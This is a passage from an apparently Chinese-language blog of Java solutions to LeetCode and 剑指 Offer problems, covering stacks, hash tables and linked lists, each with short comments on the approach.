(stack.isEmpty() || sc[i] != stack.pop()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-31-栈的压入、弹出序列"><a href="#剑指-Offer-31-栈的压入、弹出序列" class="headerlink" title="剑指 Offer 31. 栈的压入、弹出序列"></a><a href="https://leetcode-cn.com/problems/zhan-de-ya-ru-dan-chu-xu-lie-lcof/">剑指 Offer 31. 栈的压入、弹出序列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 判断合不合法，用个栈试一试: </span></span><br><span class="line"><span class="comment">// 把压栈的元素按顺序压入，当栈顶元素和出栈的第一个元素相同，则将该元素弹出，出栈列表指针后移并继续判断。</span></span><br><span class="line"><span class="comment">// 最后判断出栈列表指针是否指向出栈列表的末尾即可。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validateStackSequences</span><span class="params">(<span class="type">int</span>[] pushed, <span class="type">int</span>[] popped)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> e :</span><br><span class="line">                pushed) &#123;</span><br><span class="line">            stack.push(e);</span><br><span class="line">            <span class="keyword">while</span> (j &lt; popped.length &amp;&amp; !stack.isEmpty() &amp;&amp; popped[j] == stack.peek()) &#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="155-最小栈"><a href="#155-最小栈" class="headerlink" title=" 155. 最小栈"></a><a href="https://leetcode-cn.com/problems/min-stack"> 155. 最小栈</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; s1;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; s2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MinStack</span><span class="params">()</span> &#123;</span><br><span class="line">        s1 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        s2 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        s1.push(val);</span><br><span class="line">        <span class="keyword">if</span> (!s2.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s2.peek() &gt;= val) &#123;</span><br><span class="line">                s2.push(val);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s2.push(val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pop</span> <span class="operator">=</span> s1.pop();</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> s2.peek();</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (min == pop) &#123;</span><br><span class="line">            s2.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s1.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s2.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="哈希表"><a href="#哈希表" class="headerlink" title="哈希表"></a>哈希表</h2><h3 id="1-两数之和-x2F-x2F"><a href="#1-两数之和-x2F-x2F" class="headerlink" title="1. 两数之和&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/two-sum/">1. 两数之和</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;i, map.get(target - nums[i])&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            map.put(nums[i], i);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="36-有效的数独-x2F-x2F"><a href="#36-有效的数独-x2F-x2F" class="headerlink" title="36. 有效的数独&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/valid-sudoku/">36. 有效的数独</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用空间换时间, 3个9*9boolean矩阵,先验证行,再验证列,再验证块,出现的标记为true;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidSudoku</span><span class="params">(<span class="type">char</span>[][] board)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span>[][] row = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="type">boolean</span>[][] col = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="type">boolean</span>[][] block = <span class="keyword">new</span> <span class="title class_">boolean</span>[<span class="number">9</span>][<span class="number">9</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">9</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">9</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (board[i][j] == <span class="string">&#x27;.&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">t</span> <span class="operator">=</span> board[i][j] - <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">blockIndex</span> <span class="operator">=</span> (i / <span class="number">3</span>) * <span class="number">3</span> + j / <span class="number">3</span>; </span><br><span class="line">                <span class="keyword">if</span> (row[i][t] || col[j][t] || block[blockIndex][t]) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                row[i][t] = <span class="literal">true</span>;</span><br><span class="line">                col[j][t] = <span class="literal">true</span>;</span><br><span class="line">                block[blockIndex][t] = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-50-第一个只出现一次的字符"><a href="#剑指-Offer-50-第一个只出现一次的字符" class="headerlink" title="剑指 Offer 50. 第一个只出现一次的字符"></a><a href="https://leetcode-cn.com/problems/di-yi-ge-zhi-chu-xian-yi-ci-de-zi-fu-lcof/">剑指 Offer 50. 第一个只出现一次的字符</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 字典(99%)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">firstUniqChar</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">26</span>];</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : sc</span><br><span class="line">                ) &#123;</span><br><span class="line">            temp[c - <span class="string">&#x27;a&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[c - <span class="string">&#x27;a&#x27;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 哈希表68%</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">char</span> <span class="title function_">firstUniqChar</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        HashMap&lt;Character, Boolean&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(c)) &#123;</span><br><span class="line">                map.put(c, <span class="literal">false</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                map.put(c, <span class="literal">true</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c :</span><br><span class="line">                sc) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(c)) &#123;</span><br><span class="line">                <span class="keyword">return</span> c;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="41-缺失的第一个正数"><a href="#41-缺失的第一个正数" class="headerlink" title="41. 缺失的第一个正数"></a><a href="https://leetcode-cn.com/problems/first-missing-positive">41. 缺失的第一个正数</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hashset</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        HashSet&lt;Integer&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            set.add(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!set.contains(i)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原地哈希</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span>(nums[i] &gt;= <span class="number">1</span> &amp;&amp; nums[i] != i+<span class="number">1</span> &amp;&amp; nums[i] - <span class="number">1</span> &lt; len &amp;&amp; nums[i] != nums[nums[i] - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[nums[i]-<span class="number">1</span>];</span><br><span class="line">                nums[nums[i]-<span class="number">1</span>] = nums[i];</span><br><span class="line">                nums[i] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i] != i+<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> len+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原地哈希(优先使用这个)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">firstMissingPositive</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= <span class="number">0</span> || nums[i] &gt; n) &#123;</span><br><span class="line">                nums[i] = -<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == -<span class="number">1</span> || nums[i] == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (nums[(nums[i] - <span class="number">1</span>) % n] == -<span class="number">1</span>) &#123;</span><br><span class="line">                nums[(nums[i] - <span class="number">1</span>) % n] = nums[i]+ n;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                nums[(nums[i] - <span class="number">1</span>) % n] += n;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((nums[i] &lt;= n &amp;&amp; nums[i] &gt;= <span class="number">1</span> )|| nums[i] == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> n + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="206-反转链表-x2F"><a href="#206-反转链表-x2F" class="headerlink" title="206. 反转链表&#x2F;"></a><a href="https://leetcode-cn.com/problems/reverse-linked-list/">206. 反转链表</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 头插法</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">        dummy.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span> (p != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> p .next;</span><br><span class="line">            p.next = dummy.next;</span><br><span class="line">            dummy.next = p;</span><br><span class="line">            p = q;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">    head.next.next = head;</span><br><span class="line">    head.next = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-两数相加-x2F-x2F"><a href="#2-两数相加-x2F-x2F" class="headerlink" title="2. 两数相加&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/add-two-numbers/">2. 两数相加</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="type">int</span> <span class="variable">carry</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span> || l2 != <span class="literal">null</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> l1 == <span class="literal">null</span> ? <span class="number">0</span> : l1.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> l2 == <span class="literal">null</span> ? <span class="number">0</span> : l2.val;</span><br><span class="line">            <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> a + b + carry;</span><br><span class="line">            carry = sum / <span class="number">10</span>;</span><br><span class="line">            tail.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum % <span class="number">10</span>);</span><br><span class="line">            tail = tail.next;</span><br><span class="line">            <span class="keyword">if</span> (l1 != <span class="literal">null</span>) &#123;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        tail.next = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="21-合并两个有序链表-x2F-x2F-x2F"><a href="#21-合并两个有序链表-x2F-x2F-x2F" class="headerlink" title="21. 合并两个有序链表&#x2F;&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/merge-two-sorted-lists/">21. 合并两个有序链表</a>&#x2F;&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 递归 O(m+n) O(m+n)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (l1 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125;</span><br><span class="line">       </span><br><span class="line">        <span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> mergeTwoLists(l1.next, l2);</span><br><span class="line">            l1.next = node;</span><br><span class="line">            <span class="keyword">return</span> l1;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> mergeTwoLists(l1, l2.next);</span><br><span class="line">            l2.next = node;</span><br><span class="line">            <span class="keyword">return</span> l2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  迭代</span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">mergeTwoLists</span><span class="params">(ListNode l1, ListNode l2)</span> &#123;</span><br><span class="line">        <span class="comment">// 用尾插法</span></span><br><span class="line">        <span class="comment">// 定义一个前置节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tail</span> <span class="operator">=</span> dummy;</span><br><span class="line">        <span class="keyword">while</span> (l1 != <span class="literal">null</span> &amp;&amp; l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 如果来l1的val小于等于l2的val</span></span><br><span class="line">            <span class="keyword">if</span> (l1.val &lt;= l2.val) &#123;</span><br><span class="line">                tail.next = l1;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                l1 = l1.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                tail.next = l2;</span><br><span class="line">                tail = tail.next;</span><br><span class="line">                l2 = l2.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 最后l1不为空最后直接接在tail</span></span><br><span class="line">        <span class="comment">// 这个就是这个</span></span><br><span class="line">        <span class="keyword">if</span> (l1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = l1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (l2 != <span class="literal">null</span>) &#123;</span><br><span class="line">            tail.next = l2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="148-排序链表-x2F"><a href="#148-排序链表-x2F" class="headerlink" title="148. 排序链表&#x2F;"></a><a href="https://leetcode-cn.com/problems/sort-list/">148. 排序链表</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 归并排序(递归法)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">sortList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="keyword">while</span> (fast != <span class="literal">null</span> &amp;&amp; fast.next != <span class="literal">null</span>) &#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> slow.next;</span><br><span class="line">        slow.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">rear</span> <span class="operator">=</span> prev;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">left</span> <span class="operator">=</span> sortList(head);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">right</span> <span class="operator">=</span> sortList(temp);</span><br><span class="line">        <span class="keyword">while</span> (left != <span class="literal">null</span> &amp;&amp; right != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (left.val &lt;= right.val) &#123;</span><br><span class="line">                rear.next = left;</span><br><span class="line">                left = left.next;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                rear.next = right;</span><br><span class="line">                right = right.next;</span><br><span class="line">            &#125;</span><br><span class="line">            rear = rear.next;</span><br><span class="line">            rear.next = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (left != <span class="literal">null</span>) &#123;</span><br><span class="line">            rear.next = left;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (right != <span class="literal">null</span>) &#123;</span><br><span class="line">            rear.next = right;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev.next;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="61-旋转链表-x2F"><a href="#61-旋转链表-x2F" class="headerlink" title="61. 旋转链表&#x2F;"></a><a href="https://leetcode-cn.com/problems/rotate-list/">61. 旋转链表</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 双指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> ListNode <span class="title function_">rotateRight</span><span class="params">(ListNode head, <span class="type">int</span> k)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="literal">null</span> || k == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">p</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">q</span> <span class="operator">=</span> head;</span><br><span class="line">    <span class="comment">// 计算链表有几个节点并将q指向链表末尾</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (q.next != <span class="literal">null</span>) 